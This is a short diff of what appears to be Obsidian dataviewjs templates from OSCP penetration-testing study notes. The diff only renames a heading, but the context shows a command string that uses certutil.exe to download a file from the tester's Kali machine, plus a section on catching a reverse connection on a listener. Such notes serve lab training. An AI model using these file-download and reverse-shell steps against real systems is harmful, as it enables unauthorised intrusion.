@@ -116,7 +116,7 @@ const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-Catch a reverse connection on the listener
+Catch a reverse connection on the listener (CMD)
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
